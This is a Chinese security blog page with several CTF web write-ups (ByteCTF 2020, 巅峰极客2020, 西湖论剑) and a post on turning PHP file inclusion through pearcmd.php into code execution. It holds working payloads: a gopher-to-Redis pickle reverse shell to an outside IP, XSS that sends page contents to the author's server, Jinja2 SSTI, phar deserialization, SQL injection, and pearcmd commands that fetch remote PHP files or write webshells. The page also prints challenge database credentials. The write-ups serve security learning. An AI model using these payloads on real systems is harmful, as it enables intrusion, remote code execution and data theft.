<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201026113031.png" alt="image528"></p>
<p>存在的pickle数据</p>
<p>网站自然提交http和https协议的url，但是因为是爬虫猜测嵌入一个a标签就可以绕过这个限制</p>
<p>提交如下网站</p>
<pre><code>&lt;a href=&quot;file:///etc/passwd&quot;&gt;</code></pre><p>成功读取到/etc/passwd，把爬虫代码爬下来本地测试</p>
<p>scrapy.cfg</p>
<pre><code class="python"># Automatically created by: scrapy startproject
#
# For more information about the [deploy] section see:
# https://scrapyd.readthedocs.io/en/latest/deploy.html

[settings]
default = bytectf.settings

[deploy]
#url = http://localhost:6800/
project = bytectf</code></pre>
<p>bytectf/settings.py</p>
<pre><code class="python">BOT_NAME = &#39;bytectf&#39;
SPIDER_MODULES = [&#39;bytectf.spiders&#39;]
NEWSPIDER_MODULE = &#39;bytectf.spiders&#39;
RETRY_ENABLED = False
ROBOTSTXT_OBEY = False
DOWNLOAD_TIMEOUT = 8
USER_AGENT = &#39;scrapy_redis&#39;
SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;
DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;
REDIS_HOST = &#39;172.20.0.7&#39;
REDIS_PORT = 6379
ITEM_PIPELINES = {
   &#39;bytectf.pipelines.BytectfPipeline&#39;: 300,
}</code></pre>
<p>bytectf/byte.py</p>
<pre><code class="python">import scrapy
import re
import base64
from scrapy_redis.spiders import RedisSpider
from bytectf.items import BytectfItem

class ByteSpider(RedisSpider):
    name = &#39;byte&#39;

    def parse(self, response):
        byte_item = BytectfItem()
        byte_item[&#39;byte_start&#39;] = response.request.url#ä¸»é®ï¼åå§url
        url_list = []
        test = response.xpath(&#39;//a/@href&#39;).getall()
        for i in test:
            if i[0] == &#39;/&#39;:
                url = response.request.url + i
            else:
                url = i
            if re.search(r&#39;://&#39;,url):
                r = scrapy.Request(url,callback=self.parse2,dont_filter=True)
                r.meta[&#39;item&#39;] = byte_item
                yield r
                url_list.append(url)
                if(len(url_list)&gt;3):
                    break
        byte_item[&#39;byte_url&#39;] = response.request.url
        byte_item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))
        yield byte_item

    def parse2(self,response):
        item = response.meta[&#39;item&#39;]
        item[&#39;byte_url&#39;] = response.request.url
        item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))
        yield item</code></pre>
<p>bytectf/items.py</p>
<pre><code class="python">import scrapy


class BytectfItem(scrapy.Item):
    # define the fields for your item here like:
    # name = scrapy.Field()
    byte_start = scrapy.Field()#
    byte_text = scrapy.Field()#text</code></pre>
<p>bytectf/pipelines.py</p>
<pre><code class="python">import pymongo

class BytectfPipeline:
    def __init__:
        MONGODB_HOST = &#39;172.20.0.8&#39;
        MONGODB_PORT = 27017
        MONGODB_DBNAME = &#39;result&#39;
        MONGODB_TABLE = &#39;result&#39;
        MONGODB_USER = &#39;N0rth3&#39;
        MONGODB_PASSWD = &#39;E7B70D0456DAD39E22735E0AC64A69AD&#39;
        mongo_client = pymongo.MongoClient(&quot;%s:%d&quot; % (MONGODB_HOST, MONGODB_PORT))
        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)
        mongo_db = mongo_client[MONGODB_DBNAME]
        self.table = mongo_db[MONGODB_TABLE]



    def process_item(self, item, spider):
        quote_info = dict(item)
        print(quote_info)
        self.table.insert(quote_info)
        return item</code></pre>
<p>测试<code>&lt;a href=&quot;gopher://.....&quot;&gt;</code>发现并不能解析gopher协议</p>
<p>继续测试发现接口<code>/result?url=https://www.4399.com</code>，也存在ssrf漏洞且至此gopher协议</p>
<p>传入以下payload:</p>
<pre><code>gopher%3a//172.20.0.7%3a6379/_%250D%250Azadd%2520byte%253Arequests%25201%2520%2522cos%255Cnsystem%255Cn%2528S%2527python%2520-c%2520%255Cx27import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253Bs.connect%2528%2528%255Cx2239.108.164.219%255Cx22%252C60003%2529%2529%253Bos.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253Bp%253Dsubprocess.call%2528%255B%255Cx22/bin/sh%255Cx22%252C%255Cx22-i%255Cx22%255D%2529%253B%255Cx27%2527%255CntR.%2522%250D%250Aquit%250D%250A</code></pre><p>成功弹回shell</p>
<h3 id="douyin-vedio"><a href="#douyin-vedio" class="headerlink" title="douyin_vedio"></a>douyin_vedio</h3><p>题目描述</p>
<blockquote>
<p>Do you like douyin video?<br>Submit your payload at <a href="http://c.bytectf.live:30002/" target="_blank" rel="noopener">http://c.bytectf.live:30002/</a></p>
<p>( Server URLs which only admin can access:<br><a href="http://a.bytectf.live:30001/" target="_blank" rel="noopener">http://a.bytectf.live:30001/</a><br><a href="http://b.bytectf.live:30001/" target="_blank" rel="noopener">http://b.bytectf.live:30001/</a> )</p>
</blockquote>
<p>题目中只能将<a href="http://a.bytectf.live:30001/" target="_blank" rel="noopener">http://a.bytectf.live:30001/</a> 开头的url发给管理员，而c.bytectf.live中存在未过滤的xss点</p>
<p>思路就很清晰了，想办法跳转到c.bytectf.live再说，我们查看源代码发现：</p>
<pre><code>RewriteRule /favicon.ico$ /favicon.ico [QSA,PT,L]
RewriteRule /$ / [QSA,PT,L]
RewriteRule /search$ /search [QSA,PT,L]
RewriteRule /send$ /send [QSA,PT,L]
RewriteRule /static/(.*)$ /static/$1 [QSA,PT,L]
RewriteRule (.*)$ http://www.douyin.com$1  </code></pre><p>最后一个神奇的重写规则，所以我们只要在<a href="http://www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss" target="_blank" rel="noopener">www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss</a></p>
<p>通常url跳转常出现在登入登出，还有外站url跳转，顺着这个思路我们可以找到<code>http://www.douyin.com/logout/?next=https%3A%2F%2Fwww.douyin.com/23333</code>可以跳转到部分域名(<a href="http://www.douyin.com" target="_blank" rel="noopener">www.douyin.com</a> , creator.douyin.com …)</p>
<p>这样就扩大了我们的攻击面，继续按照相同的思路进一步扩大攻击面的url:<code>https://creator.douyin.com/passport/web/logout/?next=https://www.douyin.com</code></p>
<p>测试发现可以跳转到任意<code>douyin.com/bytedance.com/.bytecdn.cn/ixigua.com/bytedance.net/snssdk.com/toutiao.com/huoshan.com/jinritemai.com</code>结尾的域名</p>
<p>接着用谷歌搜索：<code>site:xxxxxxx.com 跳转</code> 发现任意url跳转:<code>https://tsearch-quic.snssdk.com/search/jump?url=http://ccreater.top:60080</code></p>
<p>组合成跳转到c.bytectf.live的url:</p>
<pre><code>http://a.bytectf.live:30001/logout?next=https%3a//creator.douyin.com/passport/web/logout/%3fnext%3dhttps://tsearch-quic.snssdk.com/search/jump?url=http://c.bytectf.live:30002/?action=post%25252526id=b44cb32f302e2d4249dea06a2ffa0da1</code></pre><p>因为安全策略的设置问题(<code>frame-ancestors http://*.bytectf.live:*/</code>覆盖了<code>[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;</code>)，导致我们可以直接作为iframe导入，读取内容</p>
<pre><code>    resp.headers[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;
    resp.headers[&#39;Content-Security-Policy&#39;] = &quot;default-src http://*.bytectf.live:*/ &#39;unsafe-inline&#39;; frame-src *; frame-ancestors http://*.bytectf.live:*/&quot;
    resp.headers[&#39;X-Content-Type-Options&#39;] = &#39;nosniff&#39;
    resp.headers[&#39;Referrer-Policy&#39;] = &#39;same-origin&#39;</code></pre><p>所以xss的代码是：</p>
<pre><code class="javascript">document.domain=&quot;bytectf.live&quot;; 
flagPage=document.createElement(&quot;iframe&quot;); flagPage.src=&quot;http://a.bytectf.live:30001/?keyword=B&quot;; document.body.append(flagPage); setTimeout(()=&gt;{ document.location=&quot;http://ccreater.top:60001/&quot;+btoa(document.body.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.document.body.innerHTML) },500)
</code></pre>
<p>但是不知道为啥iframe.src=<code>http://a.bytectf.live:30001/</code>可以获取到内容，而<code>http://a.bytectf.live:30001/send</code>却不可以。。。</p>
<p>监听端口成功拿到flag</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/10/26/2020ByteCTF/">https://www.ccreater.top/2020/10/26/2020ByteCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2020/10/26/2020ByteCTF/" data-id="ckmn5dccq0006jsni4cf9gni3" data-title="2020ByteCTF" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-巅峰极客2020wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" class="article-date">
  <time class="dt-published" datetime="2020-10-20T07:51:42.731Z" itemprop="datePublished">2020-10-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="巅峰极客2020"><a href="#巅峰极客2020" class="headerlink" title="巅峰极客2020"></a>巅峰极客2020</h1><p><strong>文章首发于<a href="https://www.anquanke.com/post/id/218977" target="_blank" rel="noopener">安全客</a></strong></p>
<h2 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h2><p>文件包含：<a href="http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/index.php?action=../../../../../../../../../../../var/www/html/login" target="_blank" rel="noopener">http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/index.php?action=../../../../../../../../../../../var/www/html/login</a><br>登入接口ban掉：</p>
<pre><code>`,\,@,%,#</code></pre><pre><code>[11:00:52] 200 -   68B  - /index.php
[11:00:53] 200 -   68B  - /index.php/login/
[11:01:33] 200 -  583B  - /login.php
[11:03:57] 403 -  335B  - /server-status
[11:04:19] 403 -  336B  - /server-status/
[11:05:21] 200 -  422B  - /upload.php
[11:05:22] 403 -  329B  - /upload/
[11:05:41] 301 -  383B  - /upload  -&gt;  http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/upload/
[11:06:20] 200 -    4KB - /www.zip</code></pre><p>构造反序列化链：<code>dbCtrl::__destruct-&gt;User::__toString-&gt;Reader::__set</code></p>
<pre><code class="php">&lt;?php

Class Reader{
    public $filename;
    public $result;
    public function __construct(){

    }

}

class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public $backup;
    public function __construct(){
        $this-&gt;backup=&quot;/flag&quot;;
        $this-&gt;nickname=new Reader();
    }
}
class dbCtrl
{
    public $hostname=&quot;127.0.0.1&quot;;
    public $dbuser=&quot;p3rh4ps&quot;;
    public $dbpass=&quot;p3rh4ps&quot;;
    public $database=&quot;p3rh4ps&quot;;
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct(){
        $this-&gt;token=new User();
    }
}

$a = new dbCtrl();
@unlink(&quot;phar.phar&quot;);
$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar,phar伪协议不用phar后缀
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub,只要后面部分为__HALT_COMPILER(); 
$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
//签名自动计算
$phar-&gt;stopBuffering();
</code></pre>
<p><code>compress.zlib://phar://phar.phar/test.txt绕过限制</code></p>
<h2 id="babyback"><a href="#babyback" class="headerlink" title="babyback"></a>babyback</h2><p>php:5.6.40</p>
<p>robots.txt</p>
<pre><code>User-agent: *
Disallow: /admin</code></pre><pre><code>[12:31:50] 200 -   38B  - /admin/
[12:31:50] 200 -   38B  - /admin/?/login
[12:31:50] 200 -   38B  - /admin/index.php
[12:31:57] 200 -   48B  - /check.php
[12:32:13] 200 -   33B  - /robots.txt
[12:41:07] 200 -   29B  - /admin/.bowerrc
[12:41:26] 301 -  185B  - /admin/assets  -&gt;  http://eci-2ze91js64coeqpjda9u8.cloudeci1.ichunqiu.com/admin/assets/
[12:41:28] 200 -    1KB - /admin/bower.json
[12:41:38] 301 -  185B  - /admin/images  -&gt;  http://eci-2ze91js64coeqpjda9u8.cloudeci1.ichunqiu.com/admin/images/
[12:41:39] 200 -   38B  - /admin/index.php
[12:41:57] 200 -  620B  - /admin/package.json</code></pre><p>check.php 过滤了： </p>
<pre><code>&quot;,&#39;,-,=,;,select</code></pre><pre><code>username=aaaa\&amp;password= /sleep(5)%23bbbb</code></pre><p>存在sql注入</p>
<pre><code>账号密码
admin
uAreRigHt</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020155506.png" alt="image2642"></p>
<pre><code>EVAL($COMMAND.&quot;=FALSE&quot;);
过滤：;,&quot;,&#39;, ,|,`,^,\,;,/,*,(,),&amp;,$,#,f,F</code></pre><p>任意文件包含：</p>
<pre><code>POST /admin/ HTTP/1.1
Host: eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1600698604,1601088882; UM_distinctid=174b11256cb2fd-030f86f83a6db3-333769-240000-174b11256cd6f1; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1601100971; PHPSESSID=aabua1gfiqc9s8i13u3iqace72; __jsluid_h=89eac162499bc32092c0474accd770c5
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrD05yt5m
Content-Length: 161

------WebKitFormBoundaryrD05yt5m
Content-Disposition: form-data; name=&quot;command&quot;

?&gt;&lt;?=include&lt;&lt;&lt;DDDD
.bowerrc
DDDD
?&gt;
------WebKitFormBoundaryrD05yt5m--
</code></pre><p>读取flag</p>
<pre><code>POST /admin/ HTTP/1.1
Host: eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1600698604,1601088882; UM_distinctid=174b11256cb2fd-030f86f83a6db3-333769-240000-174b11256cd6f1; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1601100971; PHPSESSID=aabua1gfiqc9s8i13u3iqace72; __jsluid_h=89eac162499bc32092c0474accd770c5
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

command=%3f%3e%3c%3f%3dinclude%7e%3c%3c%3cDDDD%0d%0a%D0%99%93%9E%98%0d%0aDDDD%0d%0a%3f%3e</code></pre><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p><code>GET /loged?name=%7B%7B2*2%7D%7D</code><br>存在SSTI<br>模板引擎jinja2</p>
<pre><code>http://eci-2ze3domag0jprtzax0lx.cloudeci1.ichunqiu.com:8888/loged?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__==%27_IterationGuard%27%20%}{{%20c.__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27cat%20/flag%27).read()%22)%20}}{%%20endif%20%}{%%20endfor%20%}
</code></pre><p>拿flag</p>
<h2 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h2><p>任意文件读取</p>
<p>hint:register_argc_argv</p>
<pre><code>register_argc_argv    TRUE    
由于该设置为 TRUE，将总是可以在 CLI SAPI 中访问到 argc（传送给应用程序参数的个数）和 argv（包含有实际参数的数组）。

对于 PHP 4.3.0，在使用 CLI SAPI 时，PHP 变量 $argc 和 $argv 已被注册并且设定了对应的值。而在这之前的版本，这两个变量在 CGI 或者 模块 版本中的建立依赖于将 PHP 的设置选项 register_globals 设为 on。除了版本和 register_globals 设定以外，可以随时通过调用 $_SERVER 或者 $HTTP_SERVER_VARS 来访问它们。例如：$_SERVER[&#39;argv&#39;]</code></pre><p><a href="https://khack40.info/camp-ctf-2015-trolol-web-write-up/" target="_blank" rel="noopener">https://khack40.info/camp-ctf-2015-trolol-web-write-up/</a></p>
<p>找到一个类似的题目，但是他们是用变量覆盖来执行</p>
<p>阅读pearcmd的代码发现：<code>if (!isset($_SERVER[&#39;argv&#39;]) &amp;&amp; !isset($argv) &amp;&amp; !isset($HTTP_SERVER_VARS[&#39;argv&#39;]))</code></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200926190107.png" alt="image6158"></p>
<pre><code>http://eci-2zeguuukox00jv0u113l.cloudeci1.ichunqiu.com/?list+install+--installroot+/tmp/+http://ccreater.top:60006/install.php++++++++++++++$&amp;f=pearcmd&amp;</code></pre><p>后面多余部分并不影响我们下载恶意文件</p>
<p><code>http://eci-2zeguuukox00jv0u113l.cloudeci1.ichunqiu.com/?f=/tmp/tmp/pear/download/install</code></p>
<p>任意命令执行</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/10/20/巅峰极客2020wp/">https://www.ccreater.top/2020/10/20/巅峰极客2020wp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" data-id="ckmn5dcfa007ajsni5rlq54hj" data-title="巅峰极客2020wp" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-LFI利用php自带的pearcmd.php直接RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" class="article-date">
  <time class="dt-published" datetime="2020-10-20T07:48:24.276Z" itemprop="datePublished">2020-10-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="LFI利用php自带的pearcmd-php直接RCE"><a href="#LFI利用php自带的pearcmd-php直接RCE" class="headerlink" title="LFI利用php自带的pearcmd.php直接RCE"></a>LFI利用php自带的pearcmd.php直接RCE</h1><p>在做巅峰极客的一题时，用到了包含pearcmd.php从而RCE的点（perlcmd.php也是一样的），今天来研究一下这个点</p>
<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>阅读pearcmd.php中关于参数产生的那部分代码发现：</p>
<pre><code class="php">...
if (!isset($_SERVER[&#39;argv&#39;]) &amp;&amp; !isset($argv) &amp;&amp; !isset($HTTP_SERVER_VARS[&#39;argv&#39;])) {
    echo &#39;ERROR: either use the CLI php executable, &#39; .
         &#39;or set register_argc_argv=On in php.ini&#39;;
    exit(1);
}

$argv = Console_Getopt::readPHPArgv();
...
array_shift($argv);//这里删除了第一个argv，通常argv[0]是程序名
...</code></pre>
<p><code>Getopt.php:readPHPArgv</code></p>
<pre><code class="php">
    public static function readPHPArgv()
    {
        global $argv;
        if (!is_array($argv)) {
            if (!@is_array($_SERVER[&#39;argv&#39;])) {
                if (!@is_array($GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;])) {
                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;
                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);
                }
                return $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;];
            }
            return $_SERVER[&#39;argv&#39;];
        }
        return $argv;
    }</code></pre>
<p>我们发现这里的参数是从<code>$_SERVER[&#39;argv&#39;]</code>（旧版本的就是：<code>$GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;]</code>）中获取的</p>
<p>我们来测试一下<code>$_SERVER[&#39;arvg&#39;]</code>,测试代码：<code>var_dump($_SERVER[&#39;argv&#39;]);</code></p>
<p>访问<a href="http://127.0.0.1:60080/?1+2+3+4+%20+%dd" target="_blank" rel="noopener">http://127.0.0.1:60080/?1+2+3+4+%20+%dd</a></p>
<pre><code>/var/www/html/index.php:4:
array (size=6)
  0 =&gt; string &#39;1&#39; (length=1)
  1 =&gt; string &#39;2&#39; (length=1)
  2 =&gt; string &#39;3&#39; (length=1)
  3 =&gt; string &#39;4&#39; (length=1)
  4 =&gt; string &#39;%20&#39; (length=3)
  5 =&gt; string &#39;%dd&#39; (length=3)</code></pre><p>在$_SERVER[‘argv’]中的所有url编码都不会被解析，只是当成普通字符串，而+会被解析成参数的分隔符</p>
<p>于是我们便可以像在命令行一样调用pearcmd.php了，接下来就变成了利用pearcmd这个命令getshell，直接命令行尝试（太懒了）</p>
<p>查看pearcmd.php的帮助：<code>php pearcmd.php [options] command [command-options] &lt;parameters&gt;</code>，那么我们传参就得变成</p>
<p><code>url/?+[options]+command+[command-options]+&lt;parameters&gt;</code>，?后面必须跟一个+号让其作为$argv[0],这里要注意+号的数量，因为这是拿来作为分隔符的如：<code>?++</code>就会被解析成<code>[&quot;&quot;,&quot;&quot;,&quot;&quot;]</code></p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020153757.png" alt="image1911"></p>
<ol>
<li>register_argc_argv=On（默认是开的）</li>
<li>包含pearcmd.php或者peclcmd.php</li>
</ol>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>这里直接给出payload，都是直接看帮助写出来的，没啥好说的。</p>
<p>exp1:</p>
<p>需要出网</p>
<pre><code>http://192.168.43.230:60080/?+install+--installroot+/tmp/+http://ccreater.top:60006/evil.php++++++++++++++$&amp;f=pearcmd.php&amp;#把GET参数都塞到最后面
http://192.168.43.230:60080/?f=/tmp/tmp/pear/download/install.php</code></pre><p>exp2:</p>
<p>需要出网</p>
<p>会下载到当前文件夹</p>
<pre><code>http://192.168.43.230:60080/?+download+https://fuckyou.free.beeceptor.com/fuckyou.php+&amp;f=pearcmd.php#都塞到最后面
http://192.168.43.230:60080/?f=fuckyou.php</code></pre><p>exp3:</p>
<pre><code class="php">http://192.168.43.230:60080/?+config-create+/&lt;?=phpinfo();?&gt;/*+/var/www/html/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php#把GET参数都塞到路径中，这里可以用url编码来防止空格,/等对文件生成造成影响的字符
http://192.168.43.230:60080/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php</code></pre>
<p>exp4:</p>
<p><strong>最好用</strong></p>
<pre><code>http://192.168.43.230:60080/?+-c+/var/www/html/config2.php+-d+man_dir=&lt;?phpinfo();?&gt;/*+-s+list&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM#参数塞到最后面
http://192.168.43.230:60080/config2.php</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/10/20/LFI利用php自带的pearcmd.php直接RCE/">https://www.ccreater.top/2020/10/20/LFI利用php自带的pearcmd.php直接RCE/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" data-id="ckmn5dcdg001ojsnie1im08fs" data-title="LFI利用php自带的pearcmd.php直接RCE" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020西湖论剑" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" class="article-date">
  <time class="dt-published" datetime="2020-10-15T14:30:27.400Z" itemprop="datePublished">2020-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">2020西湖论剑</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="西湖论剑"><a href="#西湖论剑" class="headerlink" title="西湖论剑"></a>西湖论剑</h1><h2 id="NewUpload"><a href="#NewUpload" class="headerlink" title="NewUpload"></a>NewUpload</h2><p>hint:<br>我装了宝塔 waf，apache 环境，自己本地配一套这种环境就知道怎么弄了。<br>看看宝塔自己装的 apache 有什么东西？</p>
<p>%00干掉宝塔waf</p>
<p>任意文件上传过滤php关键字<br>上传.htaccess绕过<br>普通的payload并不适用与php-fpm通信<br>在<code>/www/server/panel/vhost/apache</code>下发现php的解析方式</p>
<pre><code> #PHP
    &lt;FilesMatch \.php$&gt;
            SetHandler &quot;proxy:unix:/tmp/php-cgi-74.sock|fcgi://localhost&quot;
    &lt;/FilesMatch&gt;</code></pre><p>直接设置<code>SetHandler &quot;proxy:unix:/tmp/php-cgi-74.sock|fcgi://localhost&quot;</code>，访问我们上传的后门并不行，查了下资料发现php-fpm有security.limit_extensions限制了php脚本的后缀名，它的默认值是:<code>.php .phar</code></p>
<p>所以我们上传phar文件getshell,getshell后发现，我们需要readflag而，命令执行函数都被干掉了，php版本是php 7.4.10</p>
